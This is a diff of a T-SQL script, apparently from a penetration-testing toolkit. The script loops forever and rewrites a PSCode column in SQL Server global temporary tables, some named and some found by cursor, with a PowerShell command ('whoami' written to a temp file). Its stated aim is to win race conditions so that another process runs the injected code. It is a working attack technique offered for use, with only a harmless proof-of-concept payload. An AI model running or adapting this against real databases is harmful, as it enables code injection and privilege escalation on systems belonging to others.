@@ -3,16 +3,32 @@
 -- Author: Scott Sutherland
 -- Description: 
 -- Update contents of all global temp tables using
--- user define code, this can be useful for exploiting 
+-- user defined code, this can be useful for exploiting 
 -- some race conditions.
 -------------------------------------------------------
 
+------------------------------------------------------
+-- Example 1: Known Table, Known Column
+------------------------------------------------------
+
 -- Loop forever
 WHILE 1=1 
-BEGIN
-	
+BEGIN	
+	-- Update table contents with custom powershell script
+	DECLARE @mycommand varchar(max)
+	SET @mycommand = 'UPDATE t1 SET t1.PSCode = ''whoami > c:\windows\temp\finishline.txt'' FROM ##temp123  t1'		
+	EXEC(@mycommand)	
+END
+
+------------------------------------------------------
+-- Example 2: Unknown Table, Known Column
+------------------------------------------------------
+
+-- Loop forever
+WHILE 1=1 
+BEGIN	
 	-- Slow down if needed
-	waitfor delay '0:0:5'
+	waitfor delay '0:0:0'
 
 	-- Setup variables
 	DECLARE @mytempname varchar(max)
@@ -24,18 +40,14 @@ BEGIN
 	OPEN MY_CURSOR
 	FETCH NEXT FROM MY_CURSOR INTO @mytempname 
 	WHILE @@FETCH_STATUS = 0
-	BEGIN 
-	    
+	BEGIN 	    
 		-- Print table name
 		PRINT @mytempname 
 	
-		-- Update table contents with script
-		DECLARE @myname varchar(max)
-		DECLARE @mycode varchar(max)
-		SET @mycode = 'write-output "Race won!" | Out-File c:\windows\temp\FinishLine.txt'
-		SET @myname = 'UPDATE [' + @mytempname + ']' 
-					  + 'SET PSCode = ''' + @mycode + ''''
-		EXEC(@myname)
+		-- Update contents of known column with ps script in an unknown temp table
+		DECLARE @mycommand varchar(max)
+		SET @mycommand = 'UPDATE t1 SET t1.PSCode = ''whoami > c:\windows\temp\finishline.txt'' FROM ' + @mytempname + '  t1'
+		EXEC(@mycommand)
 	
 		-- Next record
 		FETCH NEXT FROM MY_CURSOR INTO @mytempname  
@@ -43,3 +55,9 @@ BEGIN
 	CLOSE MY_CURSOR
 	DEALLOCATE MY_CURSOR
 END
+
+------------------------------------------------------
+-- Example 2: Unknown Table, Unkown column
+------------------------------------------------------
+-- todo
+
